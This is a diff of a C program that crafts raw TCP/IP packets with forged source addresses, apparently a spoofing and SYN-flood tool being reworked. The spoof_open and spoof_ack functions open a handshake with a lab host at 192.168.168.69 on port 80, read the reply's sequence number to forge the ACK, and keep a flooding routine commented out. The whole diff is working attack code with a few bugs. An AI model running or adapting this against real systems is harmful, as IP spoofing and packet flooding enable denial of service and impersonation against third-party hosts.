@@ -8,40 +8,31 @@
  * [3.22.96]
  */
 
-#include <stdio.h>
+#include <arpa/inet.h>
 #include <netdb.h>
 #include <sys/types.h>
 #include <sys/time.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
 #include <netinet/in.h>
+#include <net/ethernet.h>
 #include <linux/ip.h>
+#include <linux/if.h>
+#include <linux/if_packet.h>
 #include <linux/tcp.h>
+#include <linux/udp.h>
+#include <unistd.h>
 
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <linux/if_ether.h>
-#include <linux/if_packet.h>
-#include <net/ethernet.h>
-#include <linux/in.h>
-#include <arpa/inet.h>
-#include <sys/ioctl.h>
-#include <net/if.h>
 
 #define SEQ 0x28374839
-#define BUF_SIZE 1024
 
 unsigned long send_seq, ack_seq, srcport;
 char flood = 0;
-int sock, ssock;
-
-typedef struct
-{
-    unsigned long src_ip;
-    unsigned long src_port;
-    unsigned long des_ip;
-    unsigned long des_port;
-}sd_info;
+int rsock, ssock;
+int *ack_num = 0;
 
 /* Check Sum */
 unsigned short
@@ -78,7 +69,7 @@ unsigned long getaddr(char *name)
     if(!hep)
     {
         fprintf(stderr, "Unknown host %s\n", name);
-        exit(-1);
+        exit(1);
     }
     return *(unsigned long *)hep->h_addr;
 }
@@ -125,15 +116,13 @@ void send_tcp_segment(struct iphdr *ih, struct tcphdr *th, char *data, int dlen)
     if(sendto(ssock, buf, 4*ih->ihl + sizeof(*th)+ dlen, 0,
               &sin, sizeof(sin))<0)
     {
-		printf("ssock = %p\n", ssock);
-		printf("buf = %p\n", buf);
         printf("Error sending syn packet.\n");
         perror("");
-        exit(-1);
+        exit(1);
     }
 }
 
-unsigned long spoof_open(unsigned long src_ip, unsigned long des_ip, unsigned short des_port)
+unsigned long spoof_open(unsigned long my_ip, unsigned long their_ip, unsigned short port)
 {
     struct iphdr ih;
     struct tcphdr th;
@@ -149,11 +138,11 @@ unsigned long spoof_open(unsigned long src_ip, unsigned long des_ip, unsigned sh
     ih.ttl=30;
     ih.protocol=IPPROTO_TCP;
     ih.check=0;
-    ih.saddr=src_ip;
-    ih.daddr=des_ip;
+    ih.saddr=my_ip;
+    ih.daddr=their_ip;
 
     th.source=htons(srcport);
-    th.dest=htons(des_port);
+    th.dest=htons(port);
     th.seq=htonl(SEQ);
     th.doff=sizeof(th)/4;
     th.ack_seq=0;
@@ -174,7 +163,7 @@ unsigned long spoof_open(unsigned long src_ip, unsigned long des_ip, unsigned sh
     send_seq = SEQ+1+strlen(buf);
 }
 
-unsigned long spoof_ack(unsigned long src_ip, unsigned long des_ip, unsigned short des_port)
+unsigned long spoof_ack(unsigned long my_ip, unsigned long their_ip, unsigned short port)
 {
     struct iphdr ih;
     struct tcphdr th;
@@ -190,14 +179,14 @@ unsigned long spoof_ack(unsigned long src_ip, unsigned long des_ip, unsigned sho
     ih.ttl=30;
     ih.protocol=IPPROTO_TCP;
     ih.check=0;
-    ih.saddr=src_ip;
-    ih.daddr=des_ip;
+    ih.saddr=my_ip;
+    ih.daddr=their_ip;
 
     th.source=htons(srcport);
-    th.dest=htons(des_port);
-    th.seq=htonl(SEQ);
+    th.dest=htons(port);
+    th.seq=htonl(SEQ + 1);
     th.doff=sizeof(th)/4;
-    th.ack_seq=0;
+    th.ack_seq=(*ack_num);
     th.res1=0;
     th.fin=0;
     th.syn=0;
@@ -210,7 +199,7 @@ unsigned long spoof_ack(unsigned long src_ip, unsigned long des_ip, unsigned sho
     th.check=0;
     th.urg_ptr=0;
 
-    send_tcp_segment(&ih, &th, "GET / HTTP/1.1", strlen("GET / HTTP/1.1"));
+    send_tcp_segment(&ih, &th, "", 0);
 
     send_seq = SEQ+1+strlen(buf);
 }
@@ -218,67 +207,110 @@ unsigned long spoof_ack(unsigned long src_ip, unsigned long des_ip, unsigned sho
 int main(int argc, char **argv)
 {
     int i;
-    sd_info *send_info = (sd_info *)malloc(sizeof(sd_info));
     unsigned long des_ip, src_ip;
     unsigned long src_port, des_port;
-    char *buf = (char *)malloc(BUF_SIZE);
-	struct ifreq ifr;
-	char *device = "ens33";
-	struct sockaddr_ll sll;
-
-	memset(&sll, 0, sizeof(struct sockaddr_ll));
-	memset(&ifr, 0, sizeof(struct ifreq));
-
-	ssock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
-	if(ssock<0)
-	{
-		perror("socket (raw)");
-		return -1;
-	}
-
-	strncpy((char *)ifr.ifr_name, device, IFNAMSIZ);
-	if(ioctl(ssock, SIOCGIFINDEX, (char *) &ifr))
-	{
-		perror("ioctl");
-		return -1;
-	}
-
-    src_ip=getaddr("192.168.168.248");
+    char buf[1024];
+	char vbuf[0x800];
+	ssize_t msg_len = 0;
+	const char *opt = "ens33";
+	char tmp[4];
+	socklen_t socklen = 0;
+    src_ip=getaddr("192.168.168.232");
     des_ip=getaddr("192.168.168.69");
-    src_port=atoi("80");
+    src_port=atoi("65530");
     des_port=atoi("80");
+	setvbuf(stdin, vbuf, _IONBF, 0);
+	setvbuf(stdout, vbuf, _IONBF, 0);
+	setvbuf(stderr, vbuf, _IONBF, 0);
+	srcport = src_port;
+
+
+    ssock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if(ssock<0)
+    {
+        perror("ssocket (raw)");
+        exit(1);
+    }
+
+    rsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if(ssock<0)
+    {
+        perror("rsocket (raw)");
+        exit(1);
+    }
+/*
+	const int off = 0;
+	if(setsockopt(ssock, IPPROTO_RAW, IP_HDRINCL, &off, sizeof(off) < 0))
+	{
+		perror("setsockopt error!\n");
+	}
+*/
+	struct sockaddr_in sin_r;
+
+	sin_r.sin_family = AF_INET;
+	sin_r.sin_port = src_port;
+	sin_r.sin_addr.s_addr = src_ip;
+	socklen = (socklen_t) sizeof(sin_r);
+	if(bind(rsock, (struct sockaddr *)&sin_r, (socklen_t)sizeof(sin_r))== -1)
+	{
+		perror("r: Error binding raw socket to interface\n");
+		exit(-1);
+	}
+    struct sockaddr_in sin_s;
+
+    sin_s.sin_family = AF_INET;
+    sin_s.sin_port = src_port;
+    sin_s.sin_addr.s_addr = src_ip;
+    socklen = (socklen_t) sizeof(sin_s);
+    if(bind(ssock, (struct sockaddr *)&sin_s, (socklen_t)sizeof(sin_s))== -1)
+    {
+        perror("s: Error binding raw socket to interface\n");
+        exit(-1);
+    }
+
+	printf("start sending...\n");
+//	ssock = rsock;
+	spoof_open(src_ip, des_ip, des_port);
+//	sleep(1);
+
+	memset(buf, 0, sizeof(buf));
+	printf("start recv...\n");
+
+	if((msg_len = recv(rsock, buf, 0x3b - 0x0e, 0)) == -1)
+	{
+		perror("recv: ");
+		exit(-1);
+	}
+	for (i = 0; i < 4; i ++)
+	{
+		tmp[i] = buf[0x1c - 0x4 + i];
+	}
+	tmp[3] ++;
+	ack_num = (int *)tmp;
+	printf("len = %ld\n", msg_len);
+	for (i = 0; i < 128; i++)
+	{
+		if (i % 8 == 0)
+		{
+			printf(" ");
+		}
+		if (i % 0x10 == 0)
+		{
+			printf(" \n");
+		}
+		printf("%02x ", buf[i] & 0xff);
+	}
+	printf("%s\n", buf);
+	spoof_ack(src_ip, des_ip, des_port);
+/*
+	printf("flooding. each dot equals 25 packets.\n");
+
     srcport = src_port;
-
-//    ssock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    
-	sll.sll_family = AF_PACKET;
-	sll.sll_ifindex = ifr.ifr_ifindex;
-	sll.sll_protocol = htons(ETH_P_IP);
-    if(bind(ssock, (struct sockaddr*) &sll, sizeof(sll)) == -1)
-    {
-        perror("bind");
-        exit(-1);
-    }
-
-    printf("flooding. each dot equals 25 packets.\n");
-
-    spoof_open(/*0xe1e26d0a*/ src_ip, des_ip, des_port);
-	
-	memset(buf, 0, BUF_SIZE);
-    if(recv(ssock, buf, BUF_SIZE, 0) < 0)
-    {
-        perror("recv");
-        exit(-1);
-    }
-	
-    spoof_ack(/*0xe1e26d0a*/ src_ip, des_ip, des_port);
+    spoof_open(src_ip, des_ip, des_port);
+    sleep(1);
     printf(".");
 
     printf("\nFlood completed.\n");
-
-    free(send_info);
-    send_info = 0;
-	free(buf);
-	buf = 0;
+*/
     return 0;
 }
